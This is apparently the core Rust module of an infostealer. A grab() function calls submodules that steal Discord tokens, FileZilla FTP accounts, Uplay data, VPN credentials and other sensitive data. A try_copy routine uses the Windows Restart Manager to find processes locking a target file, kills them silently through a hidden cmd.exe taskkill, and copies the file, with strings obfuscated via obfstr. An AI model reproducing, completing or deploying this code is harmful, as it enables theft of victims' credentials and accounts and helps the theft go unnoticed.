use windows::{
    core::{PCWSTR, PWSTR},
    Win32::
        System::RestartManager::{
            RmGetList, RmRebootReasonNone, RmRegisterResources, RmStartSession,
            RM_PROCESS_INFO,
        },

};

pub mod discord;
pub mod filezilla;
pub mod sensitive_data;
pub mod uplay;
pub mod vpn;
use std::os::windows::process::CommandExt;

pub fn grab(path: String) {
    sensitive_data::grab_data(path.clone());
    uplay::steal_uplay(path.clone());
    filezilla::steal_ftp_account(path.clone());
    discord::steal_discord_token(path.clone());
    vpn::steal_vpn_accounts(path.clone());
}

pub fn try_copy(in_file: String, out_file: String) -> Result<bool, Box<dyn std::error::Error>> {
    let result = std::fs::copy(in_file.clone(), out_file.clone());
    if result.is_ok() {
        return Ok(true);
    }

    // fun

    unsafe {
        let mut session: u32 = 0;
        let session_ptr: *mut u32 = &mut session as _;

        let key: PWSTR = PWSTR(
            obfstr::obfstr!("be634a36-77a7-4b49-bb17-720847e87125\0")
                .encode_utf16()
                .collect::<Vec<u16>>()
                .as_ptr() as _,
        );

        let result = RmStartSession(session_ptr, 0, key);

        if result != 0 {
            return Err(std::io::Error::last_os_error().into());
        }

        // check if in_file is locked

        let path = std::path::Path::new(&in_file);

        let mut wide_path: Vec<u16> = path
            .display()
            .to_string()
            .encode_utf16()
            .chain(Some(0))
            .collect();

        let result = RmRegisterResources(
            session,
            Some(&[PCWSTR(wide_path.as_mut_ptr() as _)]),
            None,
            None,
        );

        if result != 0 {
            return Err(std::io::Error::last_os_error().into());
        }

        let mut n_proc_info_needed: u32 = 0;
        let mut n_proc_info = 0;
        let mut reason = RmRebootReasonNone.0 as u32;

        let result = RmGetList(
            session,
            &mut n_proc_info_needed,
            &mut n_proc_info,
            None,
            &mut reason,
        );

        if result == 0 {
            return Ok(false);
        }

        if result == 234 {
            // MORE DATA
            let mut proc_info: Vec<RM_PROCESS_INFO> = Vec::with_capacity(n_proc_info_needed as _);

            n_proc_info = n_proc_info_needed;

            let result = RmGetList(
                session,
                &mut n_proc_info_needed,
                &mut n_proc_info,
                Some(proc_info.as_mut_ptr()),
                &mut reason,
            );

            if result != 0 {
                return Err(std::io::Error::last_os_error().into());
            }
            proc_info.set_len(n_proc_info as _);

            for proc in proc_info {
                // taskkill
                let cmd = format!(
                    "{} {} /f",
                    obfstr::obfstr!("taskkill /pid"),
                    proc.Process.dwProcessId
                );
                let _ = std::process::Command::new(obfstr::obfstr!("cmd.exe"))
                    .creation_flags(0x08000000) // Detached Process, Dont show cmd
                    .args(&["/C", &cmd])
                    .spawn()?
                    .wait();
            }
        }

        let result = std::fs::copy(in_file.clone(), out_file.clone());
        if result.is_ok() {
            return Ok(true);
        }

    }
    Ok(false)
    
}


use std::path::{Path, PathBuf};
use std::fs;
pub fn copy_directory<U: AsRef<Path>, V: AsRef<Path>>(
    src: U,
    dst: V,
) -> std::result::Result<(), std::io::Error> {
    let mut stack = Vec::new();
    stack.push(PathBuf::from(src.as_ref()));
 
    let output_root = PathBuf::from(dst.as_ref());
    let input_root = PathBuf::from(src.as_ref()).components().count();
 
    while let Some(working_path) = stack.pop() {
        let src: PathBuf = working_path.components().skip(input_root).collect();
 
        let dest = if src.components().count() == 0 {
            output_root.clone()
        } else {
            output_root.join(&src)
        };
 
        if fs::metadata(&dest).is_err() {
            fs::create_dir_all(&dest)?;
        }
 
        for entry in fs::read_dir(working_path)? {
            let entry = entry?;
 
            if entry.file_type()?.is_dir() {
                stack.push(entry.path());
            } else {
                if let Some(filename) = entry.path().file_name() {
                    fs::copy(&entry.path(), &dest.join(filename))?;
                }
            }
        }
    }
 
    Ok(())
}